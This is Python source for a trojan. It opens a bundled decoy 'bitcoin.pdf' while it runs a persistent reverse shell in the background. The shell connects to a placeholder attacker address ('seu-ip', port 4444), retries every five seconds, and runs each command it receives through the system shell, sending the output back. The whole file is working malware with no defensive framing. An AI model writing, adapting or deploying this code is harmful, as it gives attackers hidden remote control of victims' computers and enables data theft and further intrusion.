import socket
import subprocess
import os
import sys
import webbrowser
import threading
import time

def open_pdf():
    
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    
    pdf_path = os.path.join(base_path, "bitcoin.pdf")
   
    if os.path.exists(pdf_path):
        webbrowser.open(pdf_path)

def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("seu-ip", 4444))
            
            while True:
                
                cmd = s.recv(1024).decode("utf-8").strip()
                
                if not cmd:
                    break
                if cmd.lower() == "exit":
                    break
                
                
                if cmd.lower().startswith("cd "):
                    try:
                        new_dir = cmd[3:].strip()
                        os.chdir(new_dir)
                        s.send(f"[+] Directory changed to {os.getcwd()}\n".encode())
                    except FileNotFoundError:
                        s.send(b"[-] Directory not found\n")
                    except Exception as e:
                        s.send(f"[error] {str(e)}\n".encode())
                    continue

              
                try:
                    proc = subprocess.Popen(
                        cmd, shell=True, stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, stdin=subprocess.PIPE
                    )
                    out, err = proc.communicate()
                    s.send(out + err if out or err else b"[empty]\n")
                except Exception as e:
                    s.send(f"[error] {str(e)}\n".encode())
            
            s.close()
        except Exception:
            
            time.sleep(5)
            continue

if __name__ == "__main__":
    
    threading.Thread(target=open_pdf, daemon=True).start()
    connect_back()
